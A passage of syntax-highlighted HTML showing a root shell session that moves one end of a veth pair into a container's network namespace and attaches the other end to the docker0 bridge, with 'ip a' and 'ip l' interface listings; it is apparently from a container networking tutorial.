<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">13:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> veth5472ca8@if12:</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> &lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">BROADCAST,MULTICAST,UP,LOWER_U</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">P&gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">mtu</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1500</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> qdisc</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> noqueue</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> master</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> docker0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> state</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> UP</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> mode</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> DEFAULT</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> group</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> default</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    link/ether</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ca:5b:ee:25:7e:17</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> brd</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ff:ff:ff:ff:ff:ff</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> link-netnsid</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 0</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">14:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> c2390@h2390:</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> &lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">BROADCAST,MULTICAST,M-DOW</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">N&gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">mtu</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1500</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> qdisc</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> noop</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> state</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> DOWN</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> mode</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> DEFAULT</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> group</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> default</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> qlen</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1000</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    link/ether</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 7a:16:72:92:97:ea</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> brd</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ff:ff:ff:ff:ff:ff</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">15:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> h2390@c2390:</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> &lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">BROADCAST,MULTICAST,M-DOW</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">N&gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">mtu</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1500</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> qdisc</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> noop</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> state</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> DOWN</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> mode</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> DEFAULT</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> group</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> default</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> qlen</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1000</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    link/ether</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ca:c2:d1:86:8c:e1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> brd</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ff:ff:ff:ff:ff:ff</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@out-container ~]# ip link set c</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">$CPID</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> netns </span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">$CPID</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@out-container ~]# ip a</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">1:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> lo:</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> &lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">LOOPBACK,UP,LOWER_U</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">P&gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">mtu</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 65536</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> qdisc</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> noqueue</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> state</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> UNKNOWN</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> group</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> default</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> qlen</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1000</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    link/loopback</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 00:00:00:00:00:00</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> brd</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 00:00:00:00:00:00</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    inet</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 127.0.0.1/8</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> scope</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> host</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> lo</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">       valid_lft</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> forever</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> preferred_lft</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> forever</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    inet6</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ::1/128</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> scope</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> host</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">       valid_lft</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> forever</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> preferred_lft</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> forever</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">2:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ens160:</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> &lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">BROADCAST,MULTICAST,UP,LOWER_U</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">P&gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">mtu</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1500</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> qdisc</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> mq</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> state</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> UP</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> group</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> default</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> qlen</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1000</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    link/ether</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 00:0c:29:7c:f4:a1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> brd</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ff:ff:ff:ff:ff:ff</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    inet</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 192.168.23.129/24</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> brd</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 192.168.23.255</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> scope</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> global</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> noprefixroute</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> dynamic</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ens160</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">       valid_lft</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 1235sec</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> preferred_lft</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 1235sec</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    inet6</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> fe80::d72d:aac0:a50c:7cd8/64</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> scope</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> link</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> noprefixroute</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">       valid_lft</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> forever</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> preferred_lft</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> forever</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">3:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> docker0:</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> &lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">BROADCAST,MULTICAST,UP,LOWER_U</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">P&gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">mtu</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1500</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> qdisc</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> noqueue</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> state</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> UP</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> group</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> default</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    link/ether</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 02:42:12:70:3f:6e</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> brd</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ff:ff:ff:ff:ff:ff</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    inet</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 172.17.0.1/16</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> brd</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 172.17.255.255</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> scope</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> global</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> docker0</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">       valid_lft</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> forever</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> preferred_lft</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> forever</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    inet6</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> fe80::42:12ff:fe70:3f6e/64</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> scope</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> link</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">       valid_lft</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> forever</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> preferred_lft</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> forever</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">13:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> veth5472ca8@if12:</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> &lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">BROADCAST,MULTICAST,UP,LOWER_U</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">P&gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">mtu</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1500</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> qdisc</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> noqueue</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> master</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> docker0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> state</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> UP</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> group</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> default</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    link/ether</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ca:5b:ee:25:7e:17</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> brd</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ff:ff:ff:ff:ff:ff</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> link-netnsid</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 0</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    inet6</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> fe80::c85b:eeff:fe25:7e17/64</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> scope</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> link</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">       valid_lft</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> forever</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> preferred_lft</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> forever</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">15:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> h2390@if14:</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> &lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">BROADCAST,MULTICAS</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">T&gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">mtu</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1500</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> qdisc</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> noop</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> state</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> DOWN</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> group</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> default</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> qlen</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1000</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    link/ether</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ca:c2:d1:86:8c:e1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> brd</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ff:ff:ff:ff:ff:ff</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> link-netnsid</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@out-container ~]#</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@out-container ~]#</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@out-container ~]# ip link set h</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">$CPID</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> master docker0 up</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@out-container ~]# ip l</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">1:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> lo:</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> &lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">LOOPBACK,UP,LOWER_U</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">P&gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">mtu</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 65536</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> qdisc</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> noqueue</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> state</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> UNKNOWN</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> mode</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> DEFAULT</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> group</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> default</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> qlen</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1000</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    link/loopback</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 00:00:00:00:00:00</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> brd</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 00:00:00:00:00:00</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">2:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ens160:</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> &lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">BROADCAST,MULTICAST,UP,LOWER_U</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">P&gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">mtu</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1500</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> qdisc</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> mq</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> state</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> UP</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> mode</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> DEFAULT</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> group</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> default</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> qlen</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1000</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    link/ether</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 00:0c:29:7c:f4:a1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> brd</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ff:ff:ff:ff:ff:ff</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">3:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> docker0:</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> &lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">BROADCAST,MULTICAST,UP,LOWER_U</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">P&gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">mtu</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1500</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> qdisc</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> noqueue</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> state</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> UP</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> mode</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> DEFAULT</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> group</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> default</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    link/ether</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 02:42:12:70:3f:6e</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> brd</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ff:ff:ff:ff:ff:ff</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">13:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> veth5472ca8@if12:</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> &lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">BROADCAST,MULTICAST,UP,LOWER_U</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">P&gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">mtu</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1500</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> qdisc</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> noqueue</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> master</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> docker0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> state</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> UP</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> mode</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> DEFAULT</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> group</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> default</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    link/ether</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ca:5b:ee:25:7e:17</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> brd</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ff:ff:ff:ff:ff:ff</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> link-netnsid</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 0</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">15:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> h2390@if14:</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> &lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">NO-CARRIER,BROADCAST,MULTICAST,U</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">P&gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">mtu</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1500</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> qdisc</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> noqueue</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> master</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> docker0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> state</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> LOWERLAYERDOWN</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> mode</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> DEFAULT</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> group</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> default</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> qlen</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1000</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    link/ether</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ca:c2:d1:86:8c:e1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> brd</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ff:ff:ff:ff:ff:ff</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> link-netnsid</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@out-container ~]# ip a</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">1:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> lo:</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> &lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">LOOPBACK,UP,LOWER_U</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">P&gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">mtu</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 65536</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> qdisc</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> noqueue</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> state</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> UNKNOWN</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> group</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> default</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> qlen</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1000</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    link/loopback</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 00:00:00:00:00:00</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> brd</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 00:00:00:00:00:00</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    inet</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 127.0.0.1/8</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> scope</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> host</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> lo</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">       valid_lft</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> forever</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> preferred_lft</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> forever</span></span>
